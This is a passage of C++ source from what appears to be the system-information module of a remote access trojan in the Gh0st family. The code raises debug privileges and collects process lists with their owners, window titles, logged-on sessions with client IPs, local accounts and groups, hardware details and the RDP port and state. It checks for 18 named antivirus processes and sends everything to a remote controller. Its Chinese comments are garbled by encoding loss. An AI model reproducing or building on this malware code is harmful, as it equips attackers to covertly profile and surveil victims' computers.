	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	
	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}
	
	CloseHandle(hToken);
	return bResult;	
}

void CSystemManager::SendProcessList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getProcessList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

BOOL DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath)
{
	TCHAR			szDriveStr[500];
	TCHAR			szDrive[3];
	TCHAR			szDevName[100];
	INT				cchDevName;
	INT				i;
	
	//������
	if(!pszDosPath || !pszNtPath )
		return FALSE;
	
	//��ȡ���ش����ַ���
	if(GetLogicalDriveStrings(sizeof(szDriveStr), szDriveStr))
	{
		for(i = 0; szDriveStr[i]; i += 4)
		{
			if(!_tcsicmp(&(szDriveStr[i]), "A:\\") || !_tcsicmp(&(szDriveStr[i]), "B:\\"))
				continue;
			
			szDrive[0] = szDriveStr[i];
			szDrive[1] = szDriveStr[i + 1];
			szDrive[2] = '\0';
			if(!QueryDosDevice(szDrive, szDevName, 100))//��ѯ Dos �豸��
				return FALSE;
			
			cchDevName = _tcslen(szDevName);
			if(_tcsncmp(pszDosPath, szDevName, cchDevName) == 0)//����
			{
				_tcscpy(pszNtPath, szDrive);//����������
				_tcscat(pszNtPath, pszDosPath + cchDevName);//����·��
				return TRUE;
			}			
		}
	}
	
	_tcscpy(pszNtPath, pszDosPath);
	
	return FALSE;
}

BOOL GetProcessUserName(HANDLE hProcess, TCHAR * strProcessUser)
{
	HANDLE hToken = NULL;
	BOOL bFuncReturn = FALSE;
	PTOKEN_USER pToken_User = NULL;
	DWORD dwTokenUser = 0;
	TCHAR szAccName[MAX_PATH] = {0};
	TCHAR szDomainName[MAX_PATH] = {0};
	HANDLE hProcessToken = NULL;
	if(hProcess != NULL)
	{
		// ���������̵�Ȩ��
		bFuncReturn = ::OpenProcessToken(hProcess,TOKEN_QUERY,&hToken);
		if( bFuncReturn == 0) // ʧ��
			return FALSE;
		
		if(hToken != NULL)
		{
			::GetTokenInformation(hToken, TokenUser, NULL,0L, &dwTokenUser);
			if(dwTokenUser>0)
			{
				pToken_User = (PTOKEN_USER)::GlobalAlloc( GPTR, dwTokenUser );
			}
			
			if(pToken_User != NULL)
			{
				bFuncReturn = ::GetTokenInformation(hToken, TokenUser, pToken_User, dwTokenUser, &dwTokenUser);
			}
			
			if(bFuncReturn != FALSE && pToken_User != NULL)
			{
				SID_NAME_USE eUse  = SidTypeUnknown;
				DWORD dwAccName    = 0L; 
				DWORD dwDomainName = 0L;
				PSID  pSid = pToken_User->User.Sid;
				bFuncReturn = ::LookupAccountSid(NULL, pSid, NULL, &dwAccName,
					NULL,&dwDomainName,&eUse );
				
				if(dwAccName>0 && dwAccName < MAX_PATH && dwDomainName>0 && dwDomainName <= MAX_PATH)
				{
					bFuncReturn = ::LookupAccountSid(NULL,pSid,szAccName,&dwAccName,
						szDomainName,&dwDomainName,&eUse );
				}
				
				if( bFuncReturn != 0)
					_tcscpy(strProcessUser,szAccName);

			}
		}
	}
	
	if (pToken_User != NULL)
		::GlobalFree( pToken_User );
	
	if(hToken != NULL)
		::CloseHandle(hToken);
	
	return TRUE;
}
  
LPBYTE CSystemManager::getProcessList()
{
	HANDLE			hSnapshot = NULL;
	HANDLE			hProcess = NULL;
	HMODULE			hModules = NULL;
	PROCESSENTRY32	pe32 = {0};
	DWORD			cbNeeded;
	char			strProcessName[MAX_PATH] = {0};
	char            strProcessUser[MAX_PATH] = {0};
	TCHAR           szImagePath[MAX_PATH] ={0};
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	DWORD			dwLength = 0;
	DWORD           dwWorkingSetSize = 0;
	DWORD           dwFileSize = 0;
	PROCESS_MEMORY_COUNTERS pmc;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if(hSnapshot == INVALID_HANDLE_VALUE)
		return NULL;
	
	pe32.dwSize = sizeof(PROCESSENTRY32);
	
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	
	lpBuffer[0] = TOKEN_PSLIST;
	dwOffset = 1;
	
	if(Process32First(hSnapshot, &pe32))
	{	  
		do
		{      
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
			if ((pe32.th32ProcessID !=0 ) && (pe32.th32ProcessID != 4) && (pe32.th32ProcessID != 8))
			{
				EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
				
				if(0 == GetProcessImageFileName(hProcess, szImagePath, MAX_PATH))
				{
					_tcscpy(strProcessName, "unknown erro");
					
				}
				else if(!DosPathToNtPath( szImagePath,strProcessName))
				{
					
				}

				memset(strProcessUser,0,sizeof(strProcessUser));
				if (GetProcessUserName(hProcess,strProcessUser))
				{
					if (_tcslen(strProcessUser) == 0)
					{
						_tcscpy(strProcessUser,"ERROR 2");
					}
				}
				else
				{
					_tcscpy(strProcessUser,"ERROR 1");
				}
				
				// �˽���ռ�����ݴ�С
				dwLength = sizeof(DWORD)*5 + _tcslen(pe32.szExeFile) + _tcslen(strProcessName) + _tcslen(strProcessUser) + 3;
				// ������̫С�������·�����
				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
				
				memcpy(lpBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
				dwOffset += sizeof(DWORD);	
				
				memcpy(lpBuffer + dwOffset, pe32.szExeFile, _tcslen(pe32.szExeFile) + 1);
				dwOffset += _tcslen(pe32.szExeFile) + 1;
				
				memcpy(lpBuffer + dwOffset, strProcessName, _tcslen(strProcessName) + 1);
				dwOffset += _tcslen(strProcessName) + 1;


				DWORD dwPriClass = GetPriorityClass(hProcess);
 				memcpy(lpBuffer + dwOffset, &dwPriClass, sizeof(DWORD) );
				dwOffset += sizeof(DWORD);

				dwPriClass = pe32.cntThreads;
				memcpy(lpBuffer + dwOffset, &dwPriClass, sizeof(DWORD) );
				dwOffset += sizeof(DWORD);

				memcpy(lpBuffer + dwOffset, strProcessUser, _tcslen(strProcessUser) + 1);
				dwOffset += _tcslen(strProcessUser) + 1;

				ZeroMemory(&pmc,sizeof(pmc));
				pmc.cb = sizeof(PROCESS_MEMORY_COUNTERS);
				if (GetProcessMemoryInfo( hProcess, &pmc, sizeof(pmc)) )
				{
					dwWorkingSetSize = (DWORD)(pmc.WorkingSetSize/1024);		//��λΪk
				}
				else
					dwWorkingSetSize = 0;

				memcpy(lpBuffer + dwOffset, &dwWorkingSetSize, sizeof(DWORD));
				dwOffset += sizeof(DWORD);


				HANDLE handle = CreateFile(strProcessName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
				if (handle != INVALID_HANDLE_VALUE)
				{
					dwFileSize = GetFileSize(handle, NULL)  / 1024;
					CloseHandle(handle);
				}
				else
					dwFileSize = 0;

				memcpy(lpBuffer + dwOffset, &dwFileSize, sizeof(DWORD));
				dwOffset += sizeof(DWORD);

			}

			CloseHandle(hProcess);//���޸�
		}
		while(Process32Next(hSnapshot, &pe32));
	}
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	DebugPrivilege(SE_DEBUG_NAME, FALSE); 
	CloseHandle(hSnapshot);
	return lpBuffer;	
}

void CSystemManager::SendWindowsList()
{
	LPBYTE	lpBuffer = getWindowsList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	
	LocalFree(lpBuffer);	
}

LPBYTE CSystemManager::getWindowsList()
{
	LPBYTE	lpBuffer = NULL;
	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
	lpBuffer[0] = TOKEN_WSLIST;
	return lpBuffer;	
}

bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	if(!IsWindowVisible(hwnd))
		return true;
	
	DWORD dwLength = 0;
	DWORD dwOffset = 0;
	
	LPBYTE lpBuffer = *(LPBYTE *)lParam;
	
	char strTitle[1024]={0};
	try
	{
		if (!SendMessage(hwnd,WM_GETTEXT,sizeof(strTitle)-1,(LPARAM)strTitle))
			return true;
		
		strTitle[sizeof(strTitle)-1]=0;
		
		if (_tcslen(strTitle) == 0)
			return true;
		
		if (lpBuffer == NULL)
		{
			lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);
			dwOffset=1;
		}else
		{
			dwOffset = LocalSize(lpBuffer);
			while(*(lpBuffer + dwOffset - 2)==0) dwOffset--;			
		}
		
		dwLength = sizeof(DWORD) + sizeof(DWORD) + _tcslen(strTitle) + 1;
		lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
	}catch (...)
	{
		return true;
	}
	
	GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
	memcpy(lpBuffer + dwOffset + sizeof(DWORD) ,&hwnd,sizeof(DWORD));

	memcpy(lpBuffer + dwOffset + sizeof(DWORD)*2, strTitle, _tcslen(strTitle) + 1);
	
	*(LPBYTE *)lParam = lpBuffer;
	return true;
}


void CSystemManager::SendUserStateList()
{
	LPBYTE	lpBuffer = getUserStateList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemManager::SendSysUserList()
{
	LPBYTE	lpBuffer = getSysUserList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);	
}


bool GetSessionInfo(DWORD dwSessionId, char *str,_WTS_INFO_CLASS Class)  
{  
	LPTSTR pBuffer = NULL;  
	DWORD dwBufferLen;    
	BOOL bRes = WTSQuerySessionInformation(WTS_CURRENT_SERVER_HANDLE,dwSessionId,Class, &pBuffer, &dwBufferLen);    
	if (bRes == FALSE)  
	{  
		return false;  
	}
	
	if(Class == WTSClientAddress)
	{
		PWTS_CLIENT_ADDRESS pWTSCA = (PWTS_CLIENT_ADDRESS)pBuffer;
		wsprintf(str, "%d.%d.%d.%d",pWTSCA->Address[2],pWTSCA->Address[3],pWTSCA->Address[4],pWTSCA->Address[5]); 
	}
	else
	{
		_tcscpy(str,pBuffer);  
	}

	WTSFreeMemory(pBuffer);   
	return true;  
}

LPBYTE CSystemManager::getUserStateList()
{
	LPBYTE	lpBuffer = NULL;
	DWORD	dwOffset = 0;
	DWORD	dwLength = 0;
	char	ConnectionState[MAX_PATH];   

	PWTS_SESSION_INFO ppSessionInfo = NULL;  
	WTS_SESSION_INFO  wts;
	DWORD pCount  = 0;  

	BOOL result = WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, &ppSessionInfo, &pCount);  
	if (result == FALSE)
		return NULL;

	char	strUserName[256];  
	char    strSessionId[256];
	char    strClientAddress[256];
	char    strWinStationName[256];
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = TOKEN_ASLIST;
	dwOffset = 1;

	for( DWORD i = 0; i < pCount; i++ )
	{
		wts = ppSessionInfo[i];
		
		DWORD					TSSessionId		  = wts.SessionId;
		LPTSTR					TSpWinStationName = wts.pWinStationName;
		WTS_CONNECTSTATE_CLASS	TSState			  = wts.State;

		//  ���������
		memset(strUserName,0,sizeof(strUserName));
		GetSessionInfo(TSSessionId,strUserName,WTSUserName);
		if(_tcslen(strUserName) == 0)
			continue;

		//�Ự
		memset(strWinStationName,0,sizeof(strWinStationName));
		GetSessionInfo(TSSessionId,strWinStationName, WTSWinStationName);  
		//Զ����������IP
		memset(strClientAddress,0,sizeof(strClientAddress));
		GetSessionInfo(TSSessionId,strClientAddress, WTSClientAddress);   
		//�ỰID��ʶ
		memset(strSessionId,0,sizeof(strSessionId));
		GetSessionInfo(TSSessionId,strSessionId, WTSSessionId);            


		// �Ự״̬
		memset(ConnectionState,0,sizeof(ConnectionState));
		switch( TSState )
		{
		case WTSActive:
			_tcscpy(ConnectionState,"Active");
			break;
		case WTSConnected:
			_tcscpy(ConnectionState,"Connected");
			break;
		case WTSConnectQuery:
			_tcscpy(ConnectionState,"ConnectQuery");
			break;
		case WTSShadow:
			_tcscpy(ConnectionState,"Shadow");
			break;
		case WTSDisconnected:
			_tcscpy(ConnectionState,"Disconnected");
			break;
		case WTSIdle:
			_tcscpy(ConnectionState,"SIdle");
			break;
		case WTSListen:
			_tcscpy(ConnectionState,"Listen");
			break;
		case WTSReset:
			_tcscpy(ConnectionState,"Reset");
			break;
		case WTSDown:
			_tcscpy(ConnectionState,"Down");
			break;
		case WTSInit:
			_tcscpy(ConnectionState,"Init");
			break;
		default:
			_tcscpy(ConnectionState,"error");
			break;
		}


		dwLength = _tcslen(strUserName) + _tcslen(strSessionId) + _tcslen(strClientAddress) + _tcslen(strWinStationName) + _tcslen(ConnectionState) + 5;
		// ������̫С�������·�����
		if (LocalSize(lpBuffer) < (dwOffset + dwLength))
			lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);

		memcpy(lpBuffer + dwOffset, strUserName, _tcslen(strUserName) + 1);
		dwOffset += _tcslen(strUserName) + 1;

		memcpy(lpBuffer + dwOffset, strSessionId, _tcslen(strSessionId) + 1);
		dwOffset += _tcslen(strSessionId) + 1;

		memcpy(lpBuffer + dwOffset, strClientAddress, _tcslen(strClientAddress) + 1);
		dwOffset += _tcslen(strClientAddress) + 1;

		memcpy(lpBuffer + dwOffset, strWinStationName, _tcslen(strWinStationName) + 1);
		dwOffset += _tcslen(strWinStationName) + 1;

		memcpy(lpBuffer + dwOffset, ConnectionState, _tcslen(ConnectionState) + 1);
		dwOffset += _tcslen(ConnectionState) + 1;
	}

	// �ͷ�
	WTSFreeMemory(ppSessionInfo); 

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);

	return lpBuffer;
}


void CSystemManager::SendSysInfoList()
{
	LPBYTE			lpBuffer = (LPBYTE)LocalAlloc(LPTR, sizeof(tagSystemInfo)+1);
	lpBuffer[0] = TOKEN_SSLIST;	
	if(lpBuffer == NULL)
		return;
	tagSystemInfo m_SysInfo;
	GetSystemInfo(&m_SysInfo);
	memcpy(lpBuffer + 1, &m_SysInfo, sizeof(tagSystemInfo));
	Send(lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

//======================================================================================================================
BOOL GetTerminalState()
{
	SC_HANDLE hSCManager, schService;
	SERVICE_STATUS   ssStatus;
	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hSCManager == NULL)
	{
		return FALSE;
	}
	schService = OpenService( hSCManager, "TermService", SERVICE_ALL_ACCESS);
	if(schService   ==   NULL)
	{
		return FALSE;
	}
	if (!QueryServiceStatus(schService, &ssStatus))
	{	
		CloseServiceHandle(schService);
		CloseServiceHandle(hSCManager);
		return FALSE;
	}
	CloseServiceHandle(schService);
	CloseServiceHandle(hSCManager);
	if (ssStatus.dwCurrentState != SERVICE_RUNNING)
	{
		return FALSE;
	}
	return TRUE;
}




BOOL bFindTermsrvDll()
{
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);
	char strDll[MAX_PATH];
	BOOL bRet = FALSE;
	GetSystemDirectory(strDll, sizeof(strDll));
	_tcscat(strDll, "\\termsrv_t.dll");
	
	
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, TRUE);
	HANDLE hProcessSnap= CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	//������صĽ���
	if(Process32First(hProcessSnap, &pe32))
	{
		do
		{
			HANDLE hModuleHandle = FindModule(pe32.th32ProcessID, strDll);
			if (hModuleHandle != NULL)
			{
				bRet = TRUE;
				break;
			}
			
		}while (Process32Next(hProcessSnap,&pe32));
	}
	CloseHandle(hProcessSnap);
	
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, FALSE);
	
	return bRet;
}

void Get3389State( LPTSTR lpBuffer, UINT uSize)
{
	memset(lpBuffer, 0, uSize);
	
	if (!GetTerminalState())
	{
		_tcscpy(lpBuffer, _T("3389 service off"));
		return;
	}
	
	char szCanConnect[32];
	ReadRegEx(HKEY_LOCAL_MACHINE, 
		"SYSTEM\\CurrentControlSet\\Control\\Terminal Server", 
		"fDenyTSConnections", 	REG_DWORD, 	szCanConnect,	NULL,	NULL, 	0);
	
	if (atoi(szCanConnect) != 0)
	{	
		_tcscpy(lpBuffer, _T("3389 service off"));
		return;
	}
	else if(!bIsOsXP()) 
	{
		_tcscpy(lpBuffer, _T("3389 service off"));
		return;
	}
	else
	{
		char szDllName[MAX_PATH];
		ReadRegEx(HKEY_LOCAL_MACHINE, 
			"SYSTEM\\CurrentControlSet\\Services\\TermService\\Parameters", 
			"ServiceDll", REG_EXPAND_SZ, szDllName, NULL, NULL, 0);
		
		if (strstr(szDllName, "termsrv_t") == 0)
		{
			_tcscpy(lpBuffer, _T("3389 service off"));
			return;
		}
		else
		{
			if (bFindTermsrvDll())
			{
				_tcscpy(lpBuffer, _T("3389 service off"));
				return;
			}
			else
			{
				_tcscpy(lpBuffer, _T("3389 service off"));
				return;
			}
		}
	}
	return;
}
//======================================================================================================================

void GetAntivirus(char *AllName)
{	
	char *str[18][2] = 
	{
		"360tray.exe","360",
			"360sd.exe","360SD",
			"avp.exe","Kaspersky",
			"kvmonxp.exe","Rising",
			"RavMonD.exe","Rising",
			"Mcshield.exe","McAfee",
			"egui.exe","NOD32",
			"kxetray.exe","Kingsoft",
			"TMBMSRV.exe","Trend",
			"Avgui.exe","AVG",
			"Avastsvc.exe","Avast",
			"avguard.exe","Avira",
			"bdagent.exe","BitDefender",
			"Msmpeng.exe","MSE",
			"spider.exe","Dr.Web",
			"ccapp.exe","Norton",
			"v3lsvc.exe","V3",
			"ayagent.aye","DrWeb"
	};
	
	PROCESSENTRY32 pe; 
	DWORD dwRet;
	HANDLE hSP = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if (hSP)
	{
		for (int i = 0 ; i< 18; i++)
		{
			pe.dwSize = sizeof( pe );
			
			for (dwRet = Process32First(hSP, &pe); dwRet; dwRet = Process32Next(hSP, &pe))
			{
				if (_tcsicmp( str[i][0], pe.szExeFile) == 0)
				{
					_tcscat(AllName , str[i][1]);
					_tcscat(AllName , " ");
					
					break;
				}
			}
		}
	}
	
	CloseHandle(hSP);
	
	if (_tcslen(AllName) == 0)
		_tcscpy(AllName,"δ����");
	
	return;
}

UINT Get3389Port( LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[MAX_PATH] = {0};
	memset(lpBuffer, 0, uSize);
	
	_tcscpy(strSubKey, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp");
	
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "PortNumber", REG_DWORD, (char *)lpBuffer, NULL, uSize, 0);
	
	if (_tcslen(lpBuffer) == 0)
		_tcscpy(lpBuffer,"����");
	
	return _tcslen(lpBuffer);
}


void Get_LogUser(char *lpUserName,DWORD nNameLen)
{
	DWORD	dwProcessID = GetProcessID("explorer.exe");
	if (dwProcessID == 0)
		return ;
	
	BOOL fResult = FALSE;
	HANDLE hProc = NULL;
	HANDLE hToken = NULL;
	TOKEN_USER *pTokenUser = NULL;
	
	__try
	{
		// Open the process with PROCESS_QUERY_INFORMATION access
		hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessID);
		if (hProc == NULL)
		{
			__leave;
		}
		fResult = OpenProcessToken(hProc, TOKEN_QUERY, &hToken);
		if(!fResult) 
		{
			__leave;
		}
		
		DWORD dwNeedLen = 0;	
		fResult = GetTokenInformation(hToken,TokenUser, NULL, 0, &dwNeedLen);
		if (dwNeedLen > 0)
		{
			pTokenUser = (TOKEN_USER*)new BYTE[dwNeedLen];
			fResult = GetTokenInformation(hToken,TokenUser, pTokenUser, dwNeedLen, &dwNeedLen);
			if (!fResult)
			{
				__leave;
			}
		}
		else
		{
			__leave;
		}
		
		SID_NAME_USE sn;
		TCHAR szDomainName[MAX_PATH];
		DWORD dwDmLen = MAX_PATH;
		
		fResult = LookupAccountSid(NULL, pTokenUser->User.Sid, lpUserName, &nNameLen,
			szDomainName, &dwDmLen, &sn);
	}
	__finally
	{
		if (hProc)
			::CloseHandle(hProc);
		if (hToken)
			::CloseHandle(hToken);
		if (pTokenUser)
			delete[] (char*)pTokenUser;
	}
} 
 
void CSystemManager::GetSystemInfo(tagSystemInfo* pSysInfo)
{
	ZeroMemory(pSysInfo,sizeof(tagSystemInfo));
	//��ȡCPU��Ϣ===============================
	if(
		!ReadRegEx
		(
		HKEY_LOCAL_MACHINE, 
		"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0\0", 
		"ProcessorNameString",
		REG_SZ, 
		pSysInfo->szCpuInfo, 
		NULL,
		_tcslen(pSysInfo->szCpuInfo),
		0)
		)
		_tcscpy(pSysInfo->szCpuInfo,"Find CPU infomation error");
	
	//��ȡ����ʱ��============================
	DWORD dwTime,dwDay,dwHour,dwMin;
	dwTime = GetTickCount();
	dwDay  = dwTime / (1000 * 60 * 60 * 24);
	dwTime = dwTime % (1000 * 60 * 60 * 24);
	dwHour = dwTime / (1000 * 60 * 60);
	dwTime = dwTime % (1000 * 60 * 60);
	dwMin  = dwTime / (1000 * 60);
	wsprintf(pSysInfo->szActiveTime, "������ %d�� %dСʱ %d����", dwDay,dwHour,dwMin);
	
	//��ȡɱ�����========================
    GetAntivirus(pSysInfo->szAntiVirus);
	
	//��ȡ�������========================
	gethostname(pSysInfo->szPcName,sizeof(pSysInfo->szPcName));

	//��ȡ�û���========================
    Get_LogUser(pSysInfo->szUserName,sizeof(pSysInfo->szUserName));
	//////////////////////////////////////////////////////////////////////////
	MEMORYSTATUSEX		Meminfo;
	unsigned __int64	dSize;
	memset(&Meminfo, 0, sizeof(Meminfo));
	Meminfo.dwLength = sizeof(Meminfo);
	GlobalMemoryStatusEx(&Meminfo);
	
	// �ڴ�
	dSize = (unsigned __int64)Meminfo.ullTotalPhys;
	dSize = dSize /1024/1024+1;
	pSysInfo->szMemory = dSize;
	
	// �����ڴ�
	dSize = (unsigned __int64)Meminfo.ullAvailPhys;
	dSize = dSize /1024/1024+1;
	pSysInfo->szMemoryFree = dSize;
	
	ULARGE_INTEGER nTotalBytes,
		nTotalFreeBytes,
		nTotalAvailableBytes;
	ULONG nAllGB  = 0, 
		nFreeGB = 0;
    DWORD drivertype;
    char  driver[10] = {0};
    for(int i=0; i<26; i++)
    {
		driver[0] = i + ('B');
		driver[1] = (':');
		driver[2] = ('\\');
		driver[3] = 0;
		
		drivertype = GetDriveType(driver);
        if(drivertype!=DRIVE_FIXED)
			continue;
		GetDiskFreeSpaceEx(driver,&nTotalAvailableBytes,&nTotalBytes,&nTotalFreeBytes);   
		nAllGB = nAllGB + nTotalBytes.QuadPart/1024/1024/1024;
		nFreeGB = nFreeGB + nTotalFreeBytes.QuadPart/1024/1024/1024;
    }
	// Ӳ��
	pSysInfo->szDriveSize     = nAllGB;
	// ����Ӳ��
	pSysInfo->szDriveFreeSize = nFreeGB;
	
	//��ȡԶ�̶˿�
	Get3389Port(pSysInfo->szRemotePort,sizeof(pSysInfo->szRemotePort));
	
	// ��ȡ3389״̬
	Get3389State(pSysInfo->szOpenInfo,sizeof(pSysInfo->szOpenInfo));

	
	// �ֱ���
	wsprintf(pSysInfo->szScrxy,"%d * %d",GetSystemMetrics(SM_CXSCREEN),GetSystemMetrics(SM_CYSCREEN));
	
	return;
}


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

LPBYTE CSystemManager::getSysUserList()
{
    //������ʼ   
	LPBYTE			lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = TOKEN_USLIST;
	DWORD			dwOffset = 1;
	
	char user_name[50];
	char group_name[50];
	
    LPUSER_INFO_0   bufptr   =   NULL;   
    LPUSER_INFO_0   pTmpBuf  =   NULL;   
	LPUSER_INFO_1   puiVal   =   NULL;
	LPLOCALGROUP_USERS_INFO_0 pBuf = NULL; 
    DWORD   dwLevel        = 0,
		dwEntriesRead  = 0,
		dwTotalEntries = 0, 
		dwResumeHandle = 0,
		dwPrefMaxLen = MAX_PREFERRED_LENGTH;  
	
    NET_API_STATUS   nStatus = NetUserEnum(NULL,dwLevel,FILTER_NORMAL_ACCOUNT,(LPBYTE*)&bufptr,dwPrefMaxLen,&dwEntriesRead,&dwTotalEntries,&dwResumeHandle);   
	
    if((nStatus   ==   NERR_Success)   ||   (nStatus   ==   ERROR_MORE_DATA))   
	{   
		if((pTmpBuf = bufptr) != NULL)
		{
			
			for(DWORD  i=0;i<dwEntriesRead;++i)   
			{ 
				memset(user_name,0,sizeof(user_name));
				wcstombs(user_name,pTmpBuf->usri0_name,50);   
				
				memcpy(lpBuffer + dwOffset, user_name, _tcslen(user_name)+1);
				dwOffset += _tcslen(user_name)+1;
				
				
				memset(group_name,0,sizeof(group_name));
				
				DWORD dwRead    = 0,
					dwEntries = 0; 
				NET_API_STATUS nStatus = NetUserGetLocalGroups(
					NULL,
					pTmpBuf->usri0_name,
					dwLevel,
					LG_INCLUDE_INDIRECT,
					(LPBYTE*)&pBuf,
					dwPrefMaxLen,
					&dwRead,
					&dwEntries); 
				
				
				if(nStatus == NERR_Success&&pBuf) 
					wcstombs(group_name,pBuf->lgrui0_name,50);
				else
					_tcscpy(group_name,"error");
				
				memcpy(lpBuffer + dwOffset, group_name, _tcslen(group_name) + 1);
				dwOffset += _tcslen(group_name) + 1;
				
				
				char *GetInfo="��Ծ";
				if(NERR_Success == NetUserGetInfo(NULL,pTmpBuf->usri0_name, 1, (LPBYTE *)&puiVal))
					if((puiVal->usri1_flags & UF_ACCOUNTDISABLE))
						GetInfo="����";
					
					memcpy(lpBuffer + dwOffset, GetInfo, _tcslen(GetInfo) + 1);
					dwOffset += _tcslen(GetInfo) + 1;
					
					pTmpBuf++;   
			}		
		}
		else
			goto ERRO;
	} 
	else
	{
ERRO:
	LocalFree(lpBuffer);
	return NULL;
	}
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	
	if(bufptr)   
		NetApiBufferFree(bufptr);   
	
	if(puiVal)
		NetApiBufferFree(puiVal);
	
	if (pBuf)
		NetApiBufferFree(pBuf);
	
	return lpBuffer;
}